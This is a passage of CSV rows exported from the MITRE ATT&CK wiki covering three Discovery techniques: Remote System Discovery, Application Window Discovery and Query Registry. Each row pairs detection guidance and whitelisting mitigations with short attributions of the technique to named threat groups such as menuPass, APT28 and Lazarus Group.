314,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Network protocol analysis', 'Process command-line parameters', 'Process monitoring', 'Process use of network']",['Commands such as <code>net view</code> can be used in [[Software/S0039|Net]] to gather information about available remote systems.[[CiteRef::Savill 1999]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1018'],['Remote System Discovery'],https://attack.mitre.org/wiki/Technique/T1018
315,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Network protocol analysis', 'Process command-line parameters', 'Process monitoring', 'Process use of network']",['[[Group/G0010|Turla]] surveys a system upon check-in to discover remote systems on a local network using the <code>net view</code> and <code>net view /DOMAIN</code> commands.[[CiteRef::Kaspersky Turla]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],[],['Discovery'],['Technique/T1018'],['Remote System Discovery'],https://attack.mitre.org/wiki/Technique/T1018
316,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Network protocol analysis', 'Process command-line parameters', 'Process monitoring', 'Process use of network']",['Commands such as <code>net view</code> can be used in [[Software/S0039|Net]] to gather information about available remote systems.[[CiteRef::Savill 1999]]'],['Threat Group-1314'],"['Threat Group-1314', 'TG-1314']",['G0028'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1018'],['Remote System Discovery'],https://attack.mitre.org/wiki/Technique/T1018
317,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Network protocol analysis', 'Process command-line parameters', 'Process monitoring', 'Process use of network']",['Commands such as <code>net view</code> can be used in [[Software/S0039|Net]] to gather information about available remote systems.[[CiteRef::Savill 1999]]'],['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1018'],['Remote System Discovery'],https://attack.mitre.org/wiki/Technique/T1018
318,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Network protocol analysis', 'Process command-line parameters', 'Process monitoring', 'Process use of network']",['[[Software/S0097|Ping]] can be used to identify remote systems within a network.[[CiteRef::TechNet Ping]]'],['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: Ping, ping.exe",['Discovery'],['Technique/T1018'],['Remote System Discovery'],https://attack.mitre.org/wiki/Technique/T1018
319,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Network protocol analysis', 'Process command-line parameters', 'Process monitoring', 'Process use of network']",['Commands such as <code>net view</code> can be used in [[Software/S0039|Net]] to gather information about available remote systems.[[CiteRef::Savill 1999]]'],['admin@338'],['admin@338'],['G0018'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1018'],['Remote System Discovery'],https://attack.mitre.org/wiki/Technique/T1018
320,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Network protocol analysis', 'Process command-line parameters', 'Process monitoring', 'Process use of network']",['[[Software/S0154|Cobalt Strike]] uses the native Windows Network Enumeration APIs to interrogate and discover targets in a Windows Active Directory network.[[CiteRef::cobaltstrike manual]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: Cobalt Strike,['Discovery'],['Technique/T1018'],['Remote System Discovery'],https://attack.mitre.org/wiki/Technique/T1018
321,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Network protocol analysis', 'Process command-line parameters', 'Process monitoring', 'Process use of network']","[""[[Group/G0037|FIN6]] used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.[[CiteRef::FireEye FIN6 April 2016]]""]",['FIN6'],['FIN6'],['G0037'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],[],['Discovery'],['Technique/T1018'],['Remote System Discovery'],https://attack.mitre.org/wiki/Technique/T1018
322,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Network protocol analysis', 'Process command-line parameters', 'Process monitoring', 'Process use of network']","['[[Software/S0063|SHOTPUT]] has a command to list all servers in the domain, as well as one to locate domain controllers on a domain.[[CiteRef::Palo Alto CVE-2015-3113 July 2015]]']",['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: SHOTPUT, Backdoor.APT.CookieCutter, Pirpi",['Discovery'],['Technique/T1018'],['Remote System Discovery'],https://attack.mitre.org/wiki/Technique/T1018
323,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Network protocol analysis', 'Process command-line parameters', 'Process monitoring', 'Process use of network']",['[[Software/S0097|Ping]] can be used to identify remote systems within a network.[[CiteRef::TechNet Ping]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: Ping, ping.exe",['Discovery'],['Technique/T1018'],['Remote System Discovery'],https://attack.mitre.org/wiki/Technique/T1018
324,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Network protocol analysis', 'Process command-line parameters', 'Process monitoring', 'Process use of network']",['Commands such as <code>net view</code> can be used in [[Software/S0039|Net]] to gather information about available remote systems.[[CiteRef::Savill 1999]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1018'],['Remote System Discovery'],https://attack.mitre.org/wiki/Technique/T1018
325,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Network protocol analysis', 'Process command-line parameters', 'Process monitoring', 'Process use of network']",['[[Group/G0045|menuPass]] uses scripts to enumerate IP ranges on the victim network.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]] [[Group/G0045|menuPass]] has also issued the command <code>net view /domain</code> to a [[Software/S0013|PlugX]] implant to gather information about remote systems on the network.[[CiteRef::FireEye APT10 April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],[],['Discovery'],['Technique/T1018'],['Remote System Discovery'],https://attack.mitre.org/wiki/Technique/T1018
326,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Network protocol analysis', 'Process command-line parameters', 'Process monitoring', 'Process use of network']",['Commands such as <code>net view</code> can be used in [[Software/S0039|Net]] to gather information about available remote systems.[[CiteRef::Savill 1999]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1018'],['Remote System Discovery'],https://attack.mitre.org/wiki/Technique/T1018
327,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0157|SOUNDBITE]] is capable of enumerating application windows.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: SOUNDBITE,['Discovery'],['Technique/T1010'],['Application Window Discovery'],https://attack.mitre.org/wiki/Technique/T1010
328,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0139|PowerDuke]] has a command to get text of the current foreground window.[[CiteRef::Volexity PowerDuke November 2016]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: PowerDuke,['Discovery'],['Technique/T1010'],['Application Window Discovery'],https://attack.mitre.org/wiki/Technique/T1010
329,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0032|Lazarus Group]] malware IndiaIndia obtains and sends to its C2 server the title of the window for each running process.[[CiteRef::Novetta Blockbuster Loaders]] The KilaAlfa keylogger also reports the title of the window in the foreground.[[CiteRef::Novetta Blockbuster Tools]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1010'],['Application Window Discovery'],https://attack.mitre.org/wiki/Technique/T1010
330,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [[Software/S0075|Reg]] or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0145|POWERSOURCE]] queries Registry keys in preparation for setting Run keys to achieve persistence.[[CiteRef::Cisco DNSMessenger March 2017]]'],['FIN7'],['FIN7'],['G0046'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information within the Registry, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: POWERSOURCE, DNSMessenger",['Discovery'],['Technique/T1012'],['Query Registry'],https://attack.mitre.org/wiki/Technique/T1012
331,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [[Software/S0075|Reg]] or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']","['[[Software/S0023|CHOPSTICK]] provides access to the Windows Registry, which can be used to gather information.[[CiteRef::FireEye APT28]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information within the Registry, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: CHOPSTICK, SPLM, ...",['Discovery'],['Technique/T1012'],['Query Registry'],https://attack.mitre.org/wiki/Technique/T1012
332,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [[Software/S0075|Reg]] or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0045|ADVSTORESHELL]] can enumerate registry keys.[[CiteRef::ESET Sednit Part 2]][[CiteRef::Bitdefender APT28 Dec 2015]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information within the Registry, and audit and/or block them by using 